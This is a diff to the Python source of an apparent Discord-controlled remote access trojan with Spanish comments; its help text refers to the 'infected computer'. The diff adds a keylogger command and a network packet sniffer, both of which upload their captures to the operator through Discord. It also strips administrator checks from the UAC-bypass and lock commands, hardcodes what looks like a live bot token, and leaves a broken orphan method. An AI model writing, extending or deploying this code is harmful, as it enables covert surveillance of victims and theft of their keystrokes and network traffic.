@@ -15,9 +15,14 @@ from datetime import datetime
 import tkinter as tk
 from tkinter import messagebox
 import sys  # Importar sys para manejar los parámetros
-
-bot_token = "{bot_token}"
-server_id = "{server_id}"
+import threading
+import keyboard
+import asyncio
+from scapy.all import AsyncSniffer, wrpcap, IP, TCP, UDP
+from reportlab.lib.pagesizes import letter
+from reportlab.pdfgen import canvas
+bot_token = "MTM1OTI0MDA0MjI3MDI5ODE4Nw.GlCyT5.jgr8vr-uGGBuLmvjQdwRSko4xZgNtuzqh84CuM"
+server_id = "1358874287498330253"
 
 # Intents necesarios para que el bot funcione correctamente
 intents = discord.Intents.default()
@@ -98,7 +103,8 @@ async def myhelp(ctx):
         "--> `!clipboard` = Recuperar el contenido del portapapeles del ordenador infectado\n"
         "--> `!idletime` = Obtener el tiempo de inactividad de los usuarios en el ordenador objetivo\n"
         "--> `!datetime` = Mostrar fecha y hora actuales\n"
-        "--> `!currentdir` = Mostrar el directorio actual\n\n"
+        "--> `!currentdir` = Mostrar el directorio actual\n"
+        "--> `!keylog <sec>`= Captura las teclas durente el tiempo especificados\n\n"
         
         "**Escalado de Privilegios y Control del Sistema:**\n\n"
         "--> `!getadmin` = Solicitar privilegios de administrador a través del aviso UAC\n"
@@ -135,6 +141,7 @@ async def myhelp(ctx):
         "--> `!selectcam` = Seleccionar una cámara para tomar una foto / Sintaxis: `!selectcam 1`\n"
         "--> `!webcampic` = Tomar una foto con la cámara web seleccionada\n"
         "--> `!myhelp` = Este menú de ayuda\n"
+        "--> `! sniff <sec>` = Capturar paquetes de red durante el tiempo especificado\n"
     )
 
     # Crear archivo de texto temporal con codificación UTF-8
@@ -506,9 +513,6 @@ async def takescreenshot(ctx):
 # Comando: Bloquear teclado y ratón (requiere admin)
 @bot.command(name="blockkeyboard")
 async def blockkeyboard(ctx):
-    if not is_admin():
-        await ctx.send("```Permisos de administrador requeridos.```")
-        return
     try:
         subprocess.run("RUNDLL32 user32.dll,LockWorkStation", shell=True)
         await ctx.send("```Teclado y ratón bloqueados.```")
@@ -539,9 +543,7 @@ async def uploadFile(ctx):
 # Comando: Intentar bypass UAC
 @bot.command()
 async def uacbypass(ctx):
-    if not is_admin():
-        await ctx.send("```Permisos de administrador requeridos.```")
-        return
+
     try:
         subprocess.run("start %windir%\\System32\\slui.exe", shell=True)
         await ctx.send("```Intentando bypass UAC...```")
@@ -670,6 +672,139 @@ async def getcams(ctx):
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
 
+@bot.command(name='sniff')
+async def network_sniff(ctx, seconds: int = 60):
+    """
+    Captura tráfico de red durante X segundos y genera reporte PDF
+    Uso: !sniff [segundos] (default: 60, máximo 300)
+    """
+    # Verificación de permisos de administrador (Windows)
+
+    
+
+    # Validación de tiempo
+    if seconds <= 0 or seconds > 300:
+            await ctx.send("❌ El tiempo debe ser entre 1-300 segundos")
+            return
+
+    await ctx.send(f"🕵️‍♂️ **Iniciando captura de red por {seconds} segundos...**")
+
+    class NetworkSniffer:
+        def __init__(self):
+            self.pcap_file = "temp_capture.pcap"
+            self.pdf_file = "network_report.pdf"
+            self.sniffer = None
+            self.packets = []
+
+        def packet_handler(self, packet):
+            self.packets.append(packet)
+
+        async def start_capture(self, duration):
+            self.sniffer = AsyncSniffer(prn=self.packet_handler)
+            self.sniffer.start()
+            await asyncio.sleep(duration)
+            self.sniffer.stop()
+
+            if self.packets:
+                wrpcap(self.pcap_file, self.packets)
+                return True
+            return False
+
+        def generate_report(self):
+            
+                pdf = canvas.Canvas(self.pdf_file, pagesize=letter)
+                pdf.setFont("Helvetica", 10)
+                y = 750
+                
+                # Encabezado
+                pdf.drawString(100, 780, "📊 Reporte de Tráfico de Red")
+                pdf.line(100, 775, 500, 775)
+                
+                for i, pkt in enumerate(self.packets[:100], 1):  # Limitar a 100 paquetes
+                    info = [
+                        f"Paquete #{i}",
+                        f"Protocolo: {pkt.name}",
+                        f"Tamaño: {len(pkt)} bytes"
+                    ]
+                    
+                    if IP in pkt:
+                        info.extend([
+                            f"Origen: {pkt[IP].src}",
+                            f"Destino: {pkt[IP].dst}"
+                        ])
+                    
+                    if TCP in pkt:
+                        info.append(f"TCP Ports: {pkt[TCP].sport} → {pkt[TCP].dport}")
+                    elif UDP in pkt:
+                        info.append(f"UDP Ports: {pkt[UDP].sport} → {pkt[UDP].dport}")
+
+                    for line in info:
+                        pdf.drawString(100, y, line)
+                        y -= 12
+                    
+                    y -= 10
+                    if y < 50:
+                        pdf.showPage()
+                        y = 750
+                
+                pdf.save()
+                return True
+          
+    # Ejecutar captura
+    sniffer = NetworkSniffer()
+    try:
+        if await sniffer.start_capture(seconds):
+            if sniffer.generate_report():
+                # Enviar archivos
+                await ctx.send("✅ **Captura completada**", 
+                              files=[
+                                  discord.File(sniffer.pcap_file),
+                                  discord.File(sniffer.pdf_file)
+                              ])
+            else:
+                await ctx.send("⚠ Se capturaron paquetes pero falló el reporte")
+        else:
+            await ctx.send("❌ No se capturó ningún paquete")
+    except Exception as e:
+        await ctx.send(f"❌ **Error durante la captura:** `{str(e)}`")
+    finally:
+        # Limpieza
+        for f in [sniffer.pcap_file, sniffer.pdf_file]:
+            try:
+                if os.path.exists(f):
+                    os.remove(f)
+            except:
+                pass
+
+    async def run_sniffer(self, duration: int):
+        self.packets = []
+        self._stop_event.clear()
+        
+        try:
+            self.sniffer = AsyncSniffer(prn=self._packet_callback)
+            self.sniffer.start()
+            
+            timer_task = asyncio.create_task(self._timer(duration))
+            await self._stop_event.wait()
+            
+            self.sniffer.stop()
+            timer_task.cancel()
+            
+            if self.packets:
+                wrpcap(self.pcap_file, self.packets)
+                self._analyze_packets()
+                return True
+            return False
+            
+        except Exception as e:
+            print(f"❌ Error en captura: {str(e)}")
+            return False
+        
+
+
+
+
+
 @bot.command()
 async def selectcam(ctx, cam_number: int):
     try:
@@ -689,6 +824,78 @@ async def selectcam(ctx, cam_number: int):
         cap.release()
     except Exception as e:
         await ctx.send(f"Error: {str(e)}")
+
+@bot.command()
+async def keylog(ctx, seconds: int = 60):
+    """
+    Registra las pulsaciones de teclas durante un tiempo determinado (por defecto 60 segundos).
+    Uso: !keylog [segundos] (máximo 300 segundos por seguridad)
+    """
+    try:
+        # Validar el tiempo (1-300 segundos)
+        if seconds < 1 or seconds > 300:
+            await ctx.send("❌ El tiempo debe estar entre 1 y 300 segundos.")
+            return
+
+        await ctx.send(f"🔑 **Iniciando keylogger por {seconds} segundos...** (Mantén este mensaje como referencia)")
+
+        # Configurar el keylogger
+        log = []
+        stop_event = threading.Event()
+
+        def on_key_event(e):
+            if e.event_type == keyboard.KEY_DOWN:
+                key_name = e.name
+                # Simplificar teclas especiales
+                if len(key_name) > 1:
+                    key_name = f"[{key_name}]"
+                log.append(key_name)
+
+        # Iniciar el hook de teclado
+        keyboard.hook(on_key_event)
+
+        # Temporizador en segundo plano
+        def timer():
+            time.sleep(seconds)
+            stop_event.set()
+
+        timer_thread = threading.Thread(target=timer)
+        timer_thread.start()
+
+        # Esperar mientras se registran las teclas
+        while not stop_event.is_set():
+            await asyncio.sleep(1)
+
+        # Detener el keylogger
+        keyboard.unhook_all()
+        timer_thread.join()
+
+        # Procesar el registro
+        if not log:
+            await ctx.send("⚠ No se registraron pulsaciones.")
+            return
+
+        # Limitar el tamaño del log (Discord tiene límite de 2000 caracteres)
+        log_text = " ".join(log[-500:])  # Últimas 500 teclas
+        if len(log) > 500:
+            log_text = f"... (últimas 500 de {len(log)} teclas)\n{log_text}"
+
+        # Enviar como archivo si es muy largo
+        if len(log_text) > 1500:
+            with open("keylog.txt", "w") as f:
+                f.write("Registro de teclas:\n" + " ".join(log))
+            await ctx.send(file=discord.File("keylog.txt"))
+            os.remove("keylog.txt")
+        else:
+            await ctx.send(f"**Registro de teclas ({seconds}s):**\n```\n{log_text}\n```")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+
+
+
+
 
 @bot.command()
 async def webcampic(ctx):
